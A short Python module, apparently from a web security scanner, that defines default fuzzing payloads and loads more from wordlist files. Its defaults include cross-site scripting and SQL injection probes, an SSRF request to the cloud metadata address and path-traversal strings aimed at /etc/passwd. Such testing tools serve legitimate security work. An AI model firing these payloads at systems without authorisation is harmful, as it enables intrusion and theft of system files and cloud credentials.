import os


DEFAULT_MUTATIONS = {
    "xss": ['"><svg/onload=alert(1)>', "<script>alert(1)</script>"],
    "sqli": ["' OR '1'='1", "'; WAITFOR DELAY '0:0:1'--"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/"],
    "path": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"],
}


def _read_lines(path):
    if not path or not os.path.exists(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line)
    return out


def load_mutations(config):
    tools = (config or {}).get("tools", {})
    payloads = dict(DEFAULT_MUTATIONS)
    paths = {
        "xss": tools.get("payload_xss", "wordlists/payloads/xss.txt"),
        "sqli": tools.get("payload_sqli", "wordlists/payloads/sqli.txt"),
        "ssrf": tools.get("payload_ssrf", "wordlists/payloads/ssrf.txt"),
        "path": tools.get("payload_path", "wordlists/payloads/path.txt"),
    }
    for key, p in paths.items():
        loaded = _read_lines(p)
        if loaded:
            payloads[key] = loaded
    return payloads
